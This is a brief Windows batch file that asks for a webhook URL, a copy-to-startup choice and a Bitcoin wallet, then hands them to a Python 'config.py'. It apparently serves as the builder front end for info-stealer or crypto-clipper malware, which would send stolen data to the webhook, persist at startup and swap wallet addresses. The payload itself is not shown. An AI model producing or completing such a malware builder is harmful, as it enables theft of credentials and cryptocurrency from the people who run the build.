@echo off

set /p "WebhookURL=Input Valid Wehbook URL: "
set /p "CopyToStartup=Copy to startup?(y/n): "
set /p "BTCWALLET=Enter a valid BTC wallet here('n' if no wallet): "

REM Call the Python script and pass the user input as command-line arguments (enclosed in double quotes)
python config.py "%WebhookURL%" "%CopyToStartup%" "%BTCWALLET%"

pause
